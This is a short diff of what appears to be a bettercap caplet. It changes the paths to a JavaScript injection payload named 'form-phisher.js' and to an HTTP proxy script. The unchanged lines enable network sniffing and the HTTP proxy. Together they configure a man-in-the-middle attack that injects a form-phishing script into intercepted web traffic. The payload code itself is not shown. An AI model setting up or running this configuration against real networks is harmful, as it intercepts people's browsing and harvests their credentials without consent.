@@ -1,7 +1,7 @@
 # Set the path to your JavaScript payload
-set jsinject.payload caplets/jsinject/payloads/form-phisher.js
+set jsinject.payload jsinject/payloads/form-phisher.js
 
-set http.proxy.script caplets/jsinject/jsinject.js
+set http.proxy.script jsinject/jsinject.js
 set net.sniff.verbose false
 net.sniff on
 http.proxy on
